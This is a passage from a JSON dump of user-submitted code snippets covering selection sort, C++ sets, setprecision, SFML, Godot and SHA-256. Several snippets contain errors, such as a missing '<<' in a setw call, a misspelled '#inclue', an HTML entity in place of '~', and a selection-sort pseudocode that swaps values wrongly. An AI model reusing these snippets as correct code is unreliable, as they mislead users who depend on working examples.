    "description": "vector<int> v{10,21,24,13};  int random = rand() % v.size(); int sel_elem = v[random];  cout<<\"Selected Element: \"<<sel_elem<<endl;\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3628,
    "keyword": null,
    "link": null,
    "title": " selection sort",
    "description": "# Selection Sort A = [5, 2, 4, 6, 1, 3] for i in range(len(A)):     minimum = i     for j in range(i, len(A)):         if A[j] < A[minimum]:             minimum = j     if i != minimum:         A[minimum], A[i] = A[i], A[minimum]\n// C algorithm for SelectionSort  void selectionSort(int arr[], int n) { \tfor(int i = 0; i < n-1; i++) \t{ \t\tint min = i;          \t\tfor(int j = i+1; j < n; j++) \t\t{ \t\t\tif(arr[j] < arr[min])             \tmin = j; \t\t}          \t\tif(min != i) \t\t{         \t// Swap \t\t\tint temp = arr[i]; \t\t\tarr[i] = arr[min]; \t\t\tarr[min] = temp; \t\t} \t} }\n#include <bits/stdc++.h>  using namespace std;   void selectionSort(int arr[], int n){     int i,j,min;          for(i=0;i<n-1;i++){         min = i;         for(j=i+1;j<n;j++){             if(arr[j] < arr[min]){                 min = j;             }         }         if(min != i){             swap(arr[i],arr[min]);         }     } }  int main()   {       int arr[] = { 1,4,2,5,333,3,5,7777,4,4,3,22,1,4,3,666,4,6,8,999,4,3,5,32 };       int n = sizeof(arr) / sizeof(arr[0]);        selectionSort(arr, n);        for(int i = 0; i < n; i++){         cout << arr[i] << \" \";     }      return 0;   }  \nSelectionSort(List) {   for(i from 0 to List.Length) {     SmallestElement = List[i]     for(j from i to List.Length) {       if(SmallestElement > List[j]) {         SmallestElement = List[j]       }     }     Swap(List[i], SmallestElement)   } }\n//I Love Java import java.util.*; import java.io.*; import java.util.stream.*; import static java.util.Collections.*; import static java.util.stream.Collectors.*;  public class Selection_Sort_P {     public static void main(String[] args) throws IOException {         BufferedReader buffer = new BufferedReader(new InputStreamReader(System.in));         List<Integer> arr = Stream.of(buffer.readLine().replaceAll((\"\\\\s+$\"), \"\").split(\" \")).map(Integer::parseInt)                 .collect(toList());          int high = arr.size();         selection_sort(arr, high);          System.out.println(arr);     }      public static void swap(List<Integer> arr, int i, int j) {         int temp = arr.get(i);         arr.set(i, arr.get(j));         arr.set(j, temp);     }      public static void selection_sort(List<Integer> arr, int high) {         for (int i = 0; i <= high - 1; i++) {             steps(arr, i, high);         }     }      public static void steps(List<Integer> arr, int start, int high) {         for (int i = start; i <= high - 1; i++) {             if (arr.get(i) < arr.get(start)) {                 swap(arr, start, i);             }         }     } } \nclass Sort  {      void selectionSort(int arr[])      {          int pos;         int temp;         for (int i = 0; i < arr.length; i++)          {              pos = i;              for (int j = i+1; j < arr.length; j++)             {                 if (arr[j] < arr[pos])                  //find the index of the minimum element                 {                     pos = j;                 }             }              temp = arr[pos];            //swap the current element with the minimum element             arr[pos] = arr[i];              arr[i] = temp;          }      }         void display(int arr[])                     //display the array     {          for (int i=0; i<arr.length; i++)          {             System.out.print(arr[i]+\" \");         }       }         public static void main(String args[])      {          Sort ob = new Sort();          int arr[] = {64,25,12,22,11};          ob.selectionSort(arr);          ob.display(arr);      }  }  \ndef ssort(lst):     for i in range(len(lst)):         for j in range(i+1,len(lst)):             if lst[i]>lst[j]:lst[j],lst[i]=lst[i],lst[j]     return lst if __name__=='__main__':     lst=[int(i) for i in input('Enter the Numbers: ').split()]     print(ssort(lst))\n//selection sort; timecomplexity=O(n^2);space complexity=O(n);auxiliary space complexity=O(1) #include <iostream>  using namespace std; void swap(int*,int*); void selection_sort(int arr[],int n) {     for(int i=0;i<n-1;i++)     {         for(int j=i+1;j<n;j++)         {             if(arr[i]>arr[j])             {                 swap(&arr[i],&arr[j]);             }         }     } } void display(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int array_of_numbers[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>array_of_numbers[i];     }     cout<<\"array as it was entered\"<<endl;     display(array_of_numbers,n);     cout<<\"array after sorting:\"<<endl;     selection_sort(array_of_numbers,n);     display(array_of_numbers,n);     return 0; } void swap(int *a,int *b) {     int temp=*a;     *a=*b;     *b=temp; } \nprocedure selection sort     list  : array of items    n     : size of list     for i = 1 to n - 1    /* set current element as minimum*/       min = i              /* check the element to be minimum */        for j = i+1 to n           if list[j] < list[min] then             min = j;          end if       end for        /* swap the minimum element with the current element*/       if indexMin != i  then          swap list[min] and list[i]       end if    end for \t end procedure\n     void sort(int *arr, int n){                  // Incrementa di 1 il limite inferiore del sub array da ordinare         for (int i = 0; i < n-1; i++)          {              // Trova il minimo nel subarray da ordinare             int indice_min = i;              for (int j = i+1; j < n; j++) {                                  // Confronto per trovare un nuovo minimo                 if (arr[j] < arr[indice_min])                      indice_min = j; // Salvo l'indice del nuovo minimo             }                          // Scambia il minimo trovato con il primo elemento             swap(arr,indice_min,i);             }      }           void swap(int *arr, int a , int b){         int temp = arr[a];         arr[a] = arr[b];         arr[b] = temp;     }      } \n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3629,
    "keyword": null,
    "link": null,
    "title": " self in c++",
    "description": "// Using the * operator to get the actual instance auto result = (*this).do_something();  // Using the -> operator to dereference and get/invoke member simultaneously auto result = this->do_something();\n",
    "reg_date": "2021-10-12T11:43:13.000Z"
  },
  {
    "id": 3630,
    "keyword": null,
    "link": null,
    "title": " send signals from c++ to godot",
    "description": "#include \"gdexample.h\"  using namespace godot;  void GDExample::_register_methods() {     register_method(\"_process\", &GDExample::_process); }  GDExample::GDExample() { }  GDExample::~GDExample() {     // add your cleanup here }  void GDExample::_init() {     // initialize any variables here     time_passed = 0.0; }  void GDExample::_process(float delta) {     time_passed += delta;      Vector2 new_position = Vector2(10.0 + (10.0 * sin(time_passed * 2.0)), 10.0 + (10.0 * cos(time_passed * 1.5)));      set_position(new_position); } \n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3631,
    "keyword": null,
    "link": null,
    "title": " sento freddo a un dente",
    "description": "if(male==true) \treturn \"you are dying\"\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3632,
    "keyword": null,
    "link": null,
    "title": " separation between paragraphs latex",
    "description": "\\setlength{\\parskip}{1em}\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3633,
    "keyword": null,
    "link": null,
    "title": " servicenow cart api",
    "description": "var cartId = GlideGuid.generate(null); var cart = new Cart(cartId); var item = cart.addItem('e46305bdc0a8010a00645e608031eb0f');  cart.setVariable(item,'os','Linux Red Hat'); var rc = cart.placeOrder();  gs.addInfoMessage(rc.number);\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3634,
    "keyword": null,
    "link": null,
    "title": " set::clear in C++",
    "description": "// set::clear #include <iostream> #include <set>  int main () {   std::set<int> myset;    myset.insert (100);   myset.insert (200);   myset.insert (300);    std::cout << \"myset contains:\";   for (std::set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    myset.clear();   myset.insert (1101);   myset.insert (2202);    std::cout << \"myset contains:\";   for (std::set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3635,
    "keyword": null,
    "link": null,
    "title": " set and get in c++",
    "description": "/*Get or Set are methods to Access Private Members  for example */  class Employee {   private:     // Private attribute     int salary;    public:     // Setter     void setSalary(int s) {       salary = s;     }     // Getter     int getSalary() {       return salary;     } };  int main() {   Employee myObj;   myObj.setSalary(50000);   cout << myObj.getSalary();   return 0; } \n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3636,
    "keyword": null,
    "link": null,
    "title": " set c++",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <vector> #include <algorithm> #include <set>  using namespace std; //set mentains internally the ascending order of these numbers void setDemo() { \tset<int> S; \tS.insert(1); \tS.insert(2); \tS.insert(-1); \tS.insert(-10); \tS.erase(1);//to remove an element \t \t//Print all the values of the set in ascending order \tfor(int x:S){ \t\tcout<<x<<\" \"; \t} \t \t//check whether an element is present in a set or not \tauto it = S.find(-1);//this will return an iterator to -1 \t//if not present it will return an iterator to S.end() \t \tif (it == S.end()){ \t\tcout<<\"not Present\\n\"; \t}else{ \t\tcout <<\" present\\n\"; \t\tcout << *it <<endl; \t} \t//iterator to the first element in the set which is \t//greater than or equal to -1 \tauto it2 = S.lower_bound(-1); \t//for strictly greater than -1 \tauto it3 = S.upper_bound(-1); \t//print the contents of both the iterators \tcout<<*it2<<\" \"<<*it3<<endl; } \t int main() { \tsetDemo(); \treturn 0; }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};     // s1 = {10, 6, 5, 1}       // Inserting elements in the set     s1.insert(12);     s1.insert(20);     s1.insert(3);       // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl;   }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};           // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl; }\n// constructing sets #include <iostream> #include <set>  bool fncomp (int lhs, int rhs) {return lhs<rhs;}  struct classcomp {   bool operator() (const int& lhs, const int& rhs) const   {return lhs<rhs;} };  int main () {   std::set<int> first;                           // empty set of ints    int myints[]= {10,20,30,40,50};   std::set<int> second (myints,myints+5);        // range    std::set<int> third (second);                  // a copy of second    std::set<int> fourth (second.begin(), second.end());  // iterator ctor.    std::set<int,classcomp> fifth;                 // class as Compare    bool(*fn_pt)(int,int) = fncomp;   std::set<int,bool(*)(int,int)> sixth (fn_pt);  // function pointer as Compare    return 0; }\nset<int>s; //Creates a set of integers. \n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3637,
    "keyword": null,
    "link": null,
    "title": " set cmd size c++",
    "description": "void setConsoleSize(int WIDHT, int HEIGHT) {     HWND console = GetConsoleWindow();    \tRECT r;     GetWindowRect(console, &r);     MoveWindow(console, r.left, r.top, WIDHT, HEIGHT, TRUE); }\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3638,
    "keyword": null,
    "link": null,
    "title": " set in c++",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <vector> #include <algorithm> #include <set>  using namespace std; //set mentains internally the ascending order of these numbers void setDemo() { \tset<int> S; \tS.insert(1); \tS.insert(2); \tS.insert(-1); \tS.insert(-10); \tS.erase(1);//to remove an element \t \t//Print all the values of the set in ascending order \tfor(int x:S){ \t\tcout<<x<<\" \"; \t} \t \t//check whether an element is present in a set or not \tauto it = S.find(-1);//this will return an iterator to -1 \t//if not present it will return an iterator to S.end() \t \tif (it == S.end()){ \t\tcout<<\"not Present\\n\"; \t}else{ \t\tcout <<\" present\\n\"; \t\tcout << *it <<endl; \t} \t//iterator to the first element in the set which is \t//greater than or equal to -1 \tauto it2 = S.lower_bound(-1); \t//for strictly greater than -1 \tauto it3 = S.upper_bound(-1); \t//print the contents of both the iterators \tcout<<*it2<<\" \"<<*it3<<endl; } \t int main() { \tsetDemo(); \treturn 0; }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};     // s1 = {10, 6, 5, 1}       // Inserting elements in the set     s1.insert(12);     s1.insert(20);     s1.insert(3);       // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl;   }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};           // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl; }\nset<int>s; //Creates a set of integers. \n// constructing sets #include <iostream> #include <set>  bool fncomp (int lhs, int rhs) {return lhs<rhs;}  struct classcomp {   bool operator() (const int& lhs, const int& rhs) const   {return lhs<rhs;} };  int main () {   std::set<int> first;                           // empty set of ints    int myints[]= {10,20,30,40,50};   std::set<int> second (myints,myints+5);        // range    std::set<int> third (second);                  // a copy of second    std::set<int> fourth (second.begin(), second.end());  // iterator ctor.    std::set<int,classcomp> fifth;                 // class as Compare    bool(*fn_pt)(int,int) = fncomp;   std::set<int,bool(*)(int,int)> sixth (fn_pt);  // function pointer as Compare    return 0; }\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3639,
    "keyword": null,
    "link": null,
    "title": " set in cpp",
    "description": "#include <bits/stdc++.h> #include <iostream> #include <vector> #include <algorithm> #include <set>  using namespace std; //set mentains internally the ascending order of these numbers void setDemo() { \tset<int> S; \tS.insert(1); \tS.insert(2); \tS.insert(-1); \tS.insert(-10); \tS.erase(1);//to remove an element \t \t//Print all the values of the set in ascending order \tfor(int x:S){ \t\tcout<<x<<\" \"; \t} \t \t//check whether an element is present in a set or not \tauto it = S.find(-1);//this will return an iterator to -1 \t//if not present it will return an iterator to S.end() \t \tif (it == S.end()){ \t\tcout<<\"not Present\\n\"; \t}else{ \t\tcout <<\" present\\n\"; \t\tcout << *it <<endl; \t} \t//iterator to the first element in the set which is \t//greater than or equal to -1 \tauto it2 = S.lower_bound(-1); \t//for strictly greater than -1 \tauto it3 = S.upper_bound(-1); \t//print the contents of both the iterators \tcout<<*it2<<\" \"<<*it3<<endl; } \t int main() { \tsetDemo(); \treturn 0; }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};     // s1 = {10, 6, 5, 1}       // Inserting elements in the set     s1.insert(12);     s1.insert(20);     s1.insert(3);       // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl;   }\n#include<iostream> #include<set>   using namespace std;   int main(){       // Set with values     set<int, greater<int>> s1 = {6, 10, 5, 1};           // Iterator for the set     set<int> :: iterator it;       // Print the elements of the set     for(it=s1.begin(); it != s1.end();it++)         cout<<*it<<\" \";     cout<<endl; }\n// constructing sets #include <iostream> #include <set>  bool fncomp (int lhs, int rhs) {return lhs<rhs;}  struct classcomp {   bool operator() (const int& lhs, const int& rhs) const   {return lhs<rhs;} };  int main () {   std::set<int> first;                           // empty set of ints    int myints[]= {10,20,30,40,50};   std::set<int> second (myints,myints+5);        // range    std::set<int> third (second);                  // a copy of second    std::set<int> fourth (second.begin(), second.end());  // iterator ctor.    std::set<int,classcomp> fifth;                 // class as Compare    bool(*fn_pt)(int,int) = fncomp;   std::set<int,bool(*)(int,int)> sixth (fn_pt);  // function pointer as Compare    return 0; }\n",
    "reg_date": "2021-10-12T11:43:14.000Z"
  },
  {
    "id": 3640,
    "keyword": null,
    "link": null,
    "title": " set iterator",
    "description": "import java.util.HashSet; import java.util.Set;  class IterateHashSet{    public static void main(String[] args) {      Set<String> hset = new HashSet<String>();      hset.add(\"Chaitanya\");      hset.add(\"Rahul\");        for (String temp : hset) {         System.out.println(temp);      }   } }\nimport java.util.HashSet; import java.util.Iterator;  class IterateHashSet{    public static void main(String[] args) {      HashSet<String> hset = new HashSet<String>();      hset.add(\"Chaitanya\");      hset.add(\"Rahul\");        Iterator<String> it = hset.iterator();      while(it.hasNext()){         System.out.println(it.next());      }   } }\nset<int, greater<int> >::iterator itr;\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3641,
    "keyword": null,
    "link": null,
    "title": " set keybinding for compiling c++ program in neovim",
    "description": "autocmd filetype cpp nnoremap <F10> :w !g++ -std=c++14 -O2 -Wall % -o %:r && %:r.exe\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3642,
    "keyword": null,
    "link": null,
    "title": " set precision in c++",
    "description": "#include<iomanip> #include <iostream> using namespace std;  int main() {    int num = 45;   cout << \"it is: \" << fixed << setprecision(2) << num << \" the end\"<< endl;      return 0; } \nint x = 109887; cout << fixed << setprecision(3) << x;\n#include <iomanip.h> #include <iomanip> int main() {     double num1 = 3.12345678;     cout << fixed << showpoint;     cout << setprecision(2);     cout << num1 << endl; } \n#include<iostream> #include<iomanip> using namespace std; int main() {   int i = 18;   cout<<setw(10)i; }\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3643,
    "keyword": null,
    "link": null,
    "title": " set precision in c++ no decimal places\\",
    "description": "int x = 109887; cout << fixed << setprecision(3) << x;\n14049.304930000\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3644,
    "keyword": null,
    "link": null,
    "title": " set precision with fixed c++",
    "description": "int x = 109887; cout << fixed << setprecision(3) << x;\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3645,
    "keyword": null,
    "link": null,
    "title": " set size in c++",
    "description": "set_name.size() \n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3646,
    "keyword": null,
    "link": null,
    "title": " set the jth bit from 1 to 0",
    "description": "A &= &sim;(1 << j)\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3647,
    "keyword": null,
    "link": null,
    "title": " set up nginx",
    "description": "sudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3648,
    "keyword": null,
    "link": null,
    "title": " set width qpushbutton",
    "description": "//Use this:  QPushButton* const button = new QPushButton(QString(\"<\"), this);  const QSize BUTTON_SIZE = QSize(22, 22); button->setMinimumSize(BUTTON_SIZE);  //or:  button->setSize(BUTTON_SIZE);  //or:  button->setMinimumSize(BUTTON_SIZE);  \n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3649,
    "keyword": null,
    "link": null,
    "title": " setprecision in c++",
    "description": "#include<iomanip> #include <iostream> using namespace std;  int main() {    int num = 45;   cout << \"it is: \" << fixed << setprecision(2) << num << \" the end\"<< endl;      return 0; } \nint x = 109887; cout << fixed << setprecision(3) << x;\n#include<iostream> #include<iomanip> using namespace std; int main() {   int i = 18;   cout<<setw(10)i; }\n",
    "reg_date": "2021-10-12T11:43:15.000Z"
  },
  {
    "id": 3650,
    "keyword": null,
    "link": null,
    "title": " sets in c++",
    "description": "// constructing sets #include <iostream> #include <set>  bool fncomp (int lhs, int rhs) {return lhs<rhs;}  struct classcomp {   bool operator() (const int& lhs, const int& rhs) const   {return lhs<rhs;} };  int main () {   std::set<int> first;                           // empty set of ints    int myints[]= {10,20,30,40,50};   std::set<int> second (myints,myints+5);        // range    std::set<int> third (second);                  // a copy of second    std::set<int> fourth (second.begin(), second.end());  // iterator ctor.    std::set<int,classcomp> fifth;                 // class as Compare    bool(*fn_pt)(int,int) = fncomp;   std::set<int,bool(*)(int,int)> sixth (fn_pt);  // function pointer as Compare    return 0; }\nset<int>s; //Creates a set of integers. \n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3651,
    "keyword": null,
    "link": null,
    "title": " setw in c++",
    "description": "#include<iostream> #inclue<iomanip> // Introducing the concept of setw// using namespace std; int main() {   int i = 13;   cout<<setw(19)<<i; }\nsetw(int n) \n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3652,
    "keyword": null,
    "link": null,
    "title": " sfml base program",
    "description": "#include <SFML/Graphics.hpp>  int main() {     // create the window     sf::RenderWindow window(sf::VideoMode(800, 600), \"My window\");      // run the program as long as the window is open     while (window.isOpen())     {         // check all the window's events that were triggered since the last iteration of the loop         sf::Event event;         while (window.pollEvent(event))         {             // \"close requested\" event: we close the window             if (event.type == sf::Event::Closed)                 window.close();         }          // clear the window with black color         window.clear(sf::Color::Black);          // draw everything here...         // window.draw(...);          // end the current frame         window.display();     }      return 0; }\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3653,
    "keyword": null,
    "link": null,
    "title": " sfml basic program",
    "description": "#include <SFML/Window.hpp>  int main() {     sf::RenderWindow window(sf::VideoMode(800, 600), \"My window\");      // run the program as long as the window is open     while (window.isOpen())     {         // check all the window's events that were triggered since the last iteration of the loop         sf::Event event;         while (window.pollEvent(event))         {             // \"close requested\" event: we close the window             if (event.type == sf::Event::Closed)                 window.close();         }     }      return 0; }\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3654,
    "keyword": null,
    "link": null,
    "title": " sfml default program",
    "description": "int main() {     sf::RenderWindow window(sf::VideoMode(800, 600), \"My window\");      // run the program as long as the window is open     while (window.isOpen())     {         // check all the window's events that were triggered since the last iteration of the loop         sf::Event event;         while (window.pollEvent(event))         {             // \"close requested\" event: we close the window             if (event.type == sf::Event::Closed)                 window.close();         }     }      return 0; }\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3655,
    "keyword": null,
    "link": null,
    "title": " sfml disable message",
    "description": "sf::err().rdbuf(NULL);\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3656,
    "keyword": null,
    "link": null,
    "title": " sfml draw line",
    "description": "sf::Vertex line[] = {     sf::Vertex(sf::Vector2f(10, 10)),     sf::Vertex(sf::Vector2f(150, 150)) };  window.draw(line, 2, sf::Lines);\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3657,
    "keyword": null,
    "link": null,
    "title": " sfml draw tex",
    "description": "sf::Text text;  // select the font text.setFont(font); // font is a sf::Font  // set the string to display text.setString(\"Hello world\");  // set the character size text.setCharacterSize(24); // in pixels, not points!  // set the color text.setFillColor(sf::Color::Red);  // set the text style text.setStyle(sf::Text::Bold | sf::Text::Underlined);  ...  // inside the main loop, between window.clear() and window.display() window.draw(text); \nsf::Font font; if (!font.loadFromFile(\"arial.ttf\")) {     // error... } \n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3658,
    "keyword": null,
    "link": null,
    "title": " sfml get position",
    "description": "shape.getPosition();\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3659,
    "keyword": null,
    "link": null,
    "title": " sfml hide message",
    "description": "sf::err().rdbuf(NULL);\n",
    "reg_date": "2021-10-12T11:43:16.000Z"
  },
  {
    "id": 3660,
    "keyword": null,
    "link": null,
    "title": " sfml mouse click",
    "description": "if (sf::Mouse::isButtonPressed(sf::Mouse::Left)) {     // left click... } // get global mouse position sf::Vector2i position = sf::Mouse::getPosition(); // set mouse position relative to a window sf::Mouse::setPosition(sf::Vector2i(100, 200), window);\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3661,
    "keyword": null,
    "link": null,
    "title": " sfml resize image",
    "description": "/* sf::Image newImage = sf::Image(); newImage.create(50, 50); // set size resizeImage(OldImage, newImage);  */  void resizeImage(const sf::Image& originalImage, sf::Image& resizedImage) {     const sf::Vector2u originalImageSize{ originalImage.getSize() };     const sf::Vector2u resizedImageSize{ resizedImage.getSize() };     for (unsigned int y{ 0u }; y < resizedImageSize.y; ++y)     {         for (unsigned int x{ 0u }; x < resizedImageSize.x; ++x)         {             unsigned int origX{ static_cast<unsigned int>(static_cast<double>(x) / resizedImageSize.x * originalImageSize.x) };             unsigned int origY{ static_cast<unsigned int>(static_cast<double>(y) / resizedImageSize.y * originalImageSize.y) };             resizedImage.setPixel(x, y, originalImage.getPixel(origX, origY));         }     } }\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3662,
    "keyword": null,
    "link": null,
    "title": " sfml thread multi argument function",
    "description": "// with std::bind void func(std::string, int, double) { }  sf::Thread thread(std::bind(&func, \"hello\", 24, 0.5)); \n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3663,
    "keyword": null,
    "link": null,
    "title": " sfml time set",
    "description": "sf::Time t1 = sf::microseconds(10000); sf::Time t2 = sf::milliseconds(10); sf::Time t3 = sf::seconds(0.01f); \n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3664,
    "keyword": null,
    "link": null,
    "title": " sha256 cpp",
    "description": "/*************************************************************************** C++ sha256 function SHA-256 is the most popular hash function in the SHA-2 family at the time of  writing. It provides 128 bits of security for digital signatures and hash-only  applications (SHA-1 provides only 80 bits).  Remember that while MD5 and SHA-1 are both popular hash functions,  MD5 is considered completely broken, SHA-1 is considered weak.  SHA-2 and its variants are to be crowned the new king.  If working on US Government projects, remember that NIST has deprecated  SHA-1 in since 2010, and that SHA-2 is considered approved for for new projects.  You can use SHA-256 for password hashing, just make sure to use a random salt.  Use a new random salt for each password hash to prevent the attacker from being able to pre-compute a single dictionary for all of you passwords.  When apply multiple rounds, select a good work factor.  For a work factor of 9, apply 2^9 (512) rounds SHA-256 then store the work  factor next to the salt along with the hashed password.  If you choose, you can modify your work factor later,  and because the work factor is stored with the hash,  still verify old password hashes. ******************************************************************************/ #include <iostream> #include \"sha256.h\"   using std::string; using std::cout; using std::endl;   int main(int argc, char *argv[]) {     string input = \"grape\";     string output1 = sha256(input);       cout << \"sha256('\"<< input << \"'):\" << output1 << endl;     return 0; }  /***************************************************************************** output: sha256('grape'):0f78fcc486f5315418fbf095e71c0675ee07d318e5ac4d150050cd8e57966496 ******************************************************************************/ /****************************************************************************** sha256.h  #ifndef SHA256_H #define SHA256_H #include <string>   class SHA256 { protected:     typedef unsigned char uint8;     typedef unsigned int uint32;     typedef unsigned long long uint64;       const static uint32 sha256_k[];     static const unsigned int SHA224_256_BLOCK_SIZE = (512/8); public:     void init();     void update(const unsigned char *message, unsigned int len);     void final(unsigned char *digest);     static const unsigned int DIGEST_SIZE = ( 256 / 8);   protected:     void transform(const unsigned char *message, unsigned int block_nb);     unsigned int m_tot_len;     unsigned int m_len;     unsigned char m_block[2*SHA224_256_BLOCK_SIZE];     uint32 m_h[8]; };   std::string sha256(std::string input);   #define SHA2_SHFR(x, n)    (x >> n) #define SHA2_ROTR(x, n)   ((x >> n) | (x << ((sizeof(x) << 3) - n))) #define SHA2_ROTL(x, n)   ((x << n) | (x >> ((sizeof(x) << 3) - n))) #define SHA2_CH(x, y, z)  ((x & y) ^ (~x & z)) #define SHA2_MAJ(x, y, z) ((x & y) ^ (x & z) ^ (y & z)) #define SHA256_F1(x) (SHA2_ROTR(x,  2) ^ SHA2_ROTR(x, 13) ^ SHA2_ROTR(x, 22)) #define SHA256_F2(x) (SHA2_ROTR(x,  6) ^ SHA2_ROTR(x, 11) ^ SHA2_ROTR(x, 25)) #define SHA256_F3(x) (SHA2_ROTR(x,  7) ^ SHA2_ROTR(x, 18) ^ SHA2_SHFR(x,  3)) #define SHA256_F4(x) (SHA2_ROTR(x, 17) ^ SHA2_ROTR(x, 19) ^ SHA2_SHFR(x, 10)) #define SHA2_UNPACK32(x, str)                 \\ {                                             \\     *((str) + 3) = (uint8) ((x)      );       \\     *((str) + 2) = (uint8) ((x) >>  8);       \\     *((str) + 1) = (uint8) ((x) >> 16);       \\     *((str) + 0) = (uint8) ((x) >> 24);       \\ } #define SHA2_PACK32(str, x)                   \\ {                                             \\     *(x) =   ((uint32) *((str) + 3)      )    \\            | ((uint32) *((str) + 2) <<  8)    \\            | ((uint32) *((str) + 1) << 16)    \\            | ((uint32) *((str) + 0) << 24);   \\ } #endif *******************************************************************************/\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3665,
    "keyword": null,
    "link": null,
    "title": " sherlock and anagrams hackerrank solution c++",
    "description": "// Score: 50  #include <algorithm> #include <iostream> #include <map> #include <string> using namespace std;  int main() {   int n;   cin >> n;   for (int t = 0; t < n; t++) {     string str;     cin >> str;      map<string, int> lib;      for (int i = 1; i < str.size(); i++) {       for (int j = 0; j < str.size() - i + 1; j++) {         string tmp = str.substr(j, i);         sort(tmp.begin(), tmp.end());          if (lib.find(tmp) != lib.end()) {           lib[tmp]++;         } else {           lib[tmp] = 1;         }       }     }      int ans = 0;     for (auto const &el : lib) {       ans += el.second * (el.second - 1) / 2;     }      cout << ans << endl;   }    return 0; }\n",
    "reg_date": "2021-10-12T11:43:17.000Z"
  },
  {
    "id": 3666,
    "keyword": null,
    "link": null,
    "title": " shift array elements to left c++",
